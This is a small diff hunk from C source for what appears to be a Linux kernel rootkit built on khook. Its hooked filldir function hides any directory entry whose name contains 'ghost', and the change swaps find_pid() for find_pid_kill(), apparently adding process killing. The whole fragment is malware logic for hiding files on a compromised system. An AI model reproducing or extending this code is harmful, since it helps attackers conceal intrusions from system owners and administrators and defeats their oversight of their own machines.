@@ -163,7 +163,7 @@ static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offse
 {
 
 	int ret = 0;
-	find_pid();
+	find_pid_kill();
 	
 	if (!strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
